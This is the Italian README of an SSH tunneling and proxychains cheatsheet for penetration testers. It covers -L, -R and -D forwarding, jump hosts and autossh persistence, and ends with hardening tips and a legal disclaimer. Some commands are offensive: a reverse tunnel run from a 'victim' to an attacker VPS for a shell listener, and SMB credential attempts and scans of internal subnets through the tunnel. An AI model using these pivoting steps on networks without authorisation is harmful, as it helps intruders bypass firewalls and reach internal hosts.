<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 Tunneling SSH e proxychain - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
  ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
  ███████╗███████╗███████║       ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
  ╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
  ███████║███████║██║  ██║       ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
       Pivoting, Port Forwarding (-L, -R, -D) & Proxychains Integration
```
<palign="centro">
  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="SSH Tunneling">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunnels-green?style=for-the-badge" alt="Pivoting">
  <img src="https://img.shields.io/badge/Integration-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Protocol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
</p>

<palign="centro">
  <b>🚇 Riferimento completo per tunnel SSH locali (-L), remoti/inversi (-R) e Dynamic SOCKS (-D) con integrazione Proxychains-ng</b>
</p>

---

## 📋 Sommario

- [Panoramica e architetture di tunneling](#-panoramica--architetture di tunneling)
- [Inoltro porta locale (`-L`)](#-local-port-forwarding--l)
  - [Sintassi e meccanica](#sintassi--meccanica)
  - [Inoltro di un'interfaccia Web interna](#inoltro-di-un-interfaccia-web-interna)
  - [Inoltro porte database remoto](#forwarding-remote-database-ports)
- [Remoto/Inoltro porta inverso (`-R`)](#-remote--reverse-port-forwarding--r)
  - [Sintassi e meccanica](#sintassi--meccanica-1)
  - [Esporre il gestore della shell inversa locale](#exponendo-local-reverse-shell-handler)
  - [Relaying del traffico in entrata dalla DMZ](#relaying-inbound-traffic-from-dmz)
- [Inoltro dinamico SOCKS (`-D`)](#-dynamic-socks-forwarding--d)
  - [Sintassi e configurazione SOCKS5](#sintassi--socks5-setup)
- [Configurazione Proxychains-ng](#-proxychains-ng-configurazione)
  - [Configurazione di `/etc/proxychains4.conf`](#configuring-etcproxychains4conf)
  - [Instradamento degli strumenti CLI tramite Proxychains](#routing-cli-tools-through-proxychains)
- [Pivoting multi-hop e host jump (`-J`)](#-multi-hop-pivoting--jump-hosts--j)
- [Tunnel persistenti con Autossh](#-persistent-tunnels-with-autossh)
- [Sequenze di escape SSH interattive (`~C`)](#-interactive-ssh-escape-sequences-c)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e OPSEC](#-considerazioni-difensive--opsec)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e architetture di tunneling

SSH non è semplicemente un client terminale remoto; si tratta di un livello di trasporto del flusso di byte bidirezionale crittografato che elude le policy restrittive del firewall in uscita/ingresso:

1. **Inoltro porta locale (`-L`):** Apre una porta di ascolto sul **computer locale dell'aggressore**; le connessioni vengono incanalate tramite SSH e inoltrate a una destinazione raggiungibile dal server SSH remoto.
2. **Inoltro porta remoto (`-R`):** apre una porta di ascolto sul **server SSH remoto**; le connessioni in entrata vengono reindirizzate al computer locale dell'aggressore o alla destinazione interna.
3. **Inoltro porta dinamico (`-D`):** Trasforma il client SSH in un **proxy SOCKS4/SOCKS5** locale, consentendo agli strumenti (Nmap, Burp Suite, Ffuf, Metasploit) di instradare traffico TCP arbitrario attraverso la rete remota.
```
Attacker [Kali]                  SSH Bastion / Pivot               Internal Target
 192.168.1.50   =========>       10.10.10.200 (Dual NIC)  ------>  172.16.0.15:80
   (Local)                       (SSH Server)                      (Isolated Host)
```
---

## 🔌 Inoltro porta locale (`-L`)

### Sintassi e meccanica
```
ssh -L [bind_address:]<local_port>:<destination_host>:<destination_port> user@bastion
```
### Inoltro di un'interfaccia Web interna
Accedi a un pannello di amministrazione web su `172.16.0.15:80` tramite pivot `10.10.10.200`:
```bash
ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
```
*Ora cerca `http://127.0.0.1:8080` nel tuo browser locale.*

### Inoltro delle porte del database remoto
Accedi a un database PostgreSQL interno associato solo a `127.0.0.1:5432` sul server remoto:
```bash
ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
```
> [!NOTA]
> Bandiere utilizzate:
> - `-N`: non esegue un comando shell remoto (solo tunnel).
> - `-f`: esegue in background immediatamente prima dell'esecuzione del comando.

---

## 🔄 Port forwarding remoto/inverso (`-R`)

### Sintassi e meccanica
```
ssh -R [bind_address:]<remote_port>:<local_host>:<local_port> user@attacker_vps
```
### Esposizione del gestore locale della shell inversa
Da una macchina di destinazione compromessa dietro NAT, attraversa i firewall in uscita per inviare il traffico al tuo ascoltatore esterno su VPS:
```bash
# Executed on victim / pivot machine
ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
```
### Inoltro del traffico in entrata dalla DMZ
Inoltra la porta 8080 sul pivot remoto alla porta locale 80:
```bash
ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
```
> [!IMPORTANTE]
> Per associare le porte remote a tutte le interfacce (`0.0.0.0`), `/etc/ssh/sshd_config` del server SSH deve impostare:
> `GatewayPorts yes` o `GatewayPorts clientspecified`.

---

## 🌐 Inoltro dinamico SOCKS (`-D`)

### Sintassi e configurazione SOCKS5
Crea un proxy SOCKS5 dinamico sulla porta locale `1080`:
```bash
ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
```
Verifica che il proxy SOCKS sia in ascolto:
```bash
ss -tlpn | grep 1080
```
---

## ⚙️ Configurazione di Proxychains-ng

Proxychains intercetta le chiamate di rete della libreria dinamica (`connect()`, `gethostbyname()`) tramite `LD_PRELOAD` per forzare le applicazioni CLI standard tramite proxy SOCKS/HTTP.

### Configurazione di `/etc/proxychains4.conf`
Modifica il file di configurazione in modo che punti al tuo tunnel SSH Dynamic SOCKS:
```ini
# Enable dynamic chain or strict chain
strict_chain

# Proxy DNS requests through proxy (prevents DNS leaks)
proxy_dns

[ProxyList]
# protocol  ip          port
socks5      127.0.0.1   1080
```
### Instradamento degli strumenti CLI tramite proxychain
```bash
# Nmap TCP Connect Scan (Note: SYN scans do NOT work through SOCKS proxies)
proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389

# Executing CrackMapExec / NetExec across internal subnet
proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'

# Web fuzzing internal server
proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
---

## 🔀 Host di rotazione e salto multi-hop (`-J`)

Quando si attraversano più confini di firewall segmentati:
```bash
# Jump through Bastion 1, then Bastion 2, to reach Target
ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal

# Dynamic SOCKS over double jump
ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
```
---

## 🔁 Tunnel persistenti con Autossh

Quando i tunnel SSH si interrompono a causa del timeout della rete o delle interruzioni del NAT, `autossh` monitora e riavvia automaticamente la connessione SSH:
```bash
# Install autossh
sudo apt install -y autossh

# Establish background auto-reconnecting SOCKS tunnel
autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
```
---

## ⌨️ Sequenze di escape SSH interattive (`~C`)

Se hai già una sessione SSH interattiva aperta e all'improvviso devi aprire un port forwarding senza disconnetterti:

1. Premere `Enter`
2. Digita `~C` (Tilde seguita dalla C maiuscola)
3. Il prompt cambia in `ssh> `
4. Aggiungi le tue regole di inoltro al volo:
   ```text
   ssh> -L 8080:192.168.10.50:80
   Forwarding port.
   ```
Oppure crea SOCKS dinamici:
   ```text
   ssh> -D 1080
   ```
---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando |
|-----------|---------|
| **Port Forward locale** | `ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot` |
| **Inoltro porta remota** | `ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps` |
| **Proxy SOCKS5 dinamico**| `ssh -N -D 127.0.0.1:1080 user@pivot` |
| **Tunnel silenzioso di sfondo** | `ssh -f -N -D 1080 user@pivot` |
| **Salta pivot host** | `ssh -J user@hop1,user@hop2 target` |
| **Esegui lo strumento tramite proxychains** | `proxychains4 <TOOL> <ARGS>` |
| **Riconnessione automatica persistente** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
| **Tunnel al volo** | `Enter` poi `~C` -> `ssh> -D 1080` |

---

## 🛡️ Considerazioni difensive e OPSEC

1. **Disabilita il port forwarding in SSHD:** imposta `AllowTcpForwarding no` e `PermitTunnel no` in `/etc/ssh/sshd_config` su sistemi di produzione rafforzati.
2. **Rilevamento di anomalie del flusso di rete:** sessioni SSH persistenti e di lunga durata che trasferiscono consistenti flussi di byte bidirezionali spesso indicano tunneling interattivo o esfiltrazione di dati.

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> Il tunneling SSH e il network pivoting devono essere eseguiti solo su reti e sistemi su cui è stata ottenuta esplicita autorizzazione scritta. L'elusione non autorizzata dei firewall della rete perimetrale è illegale.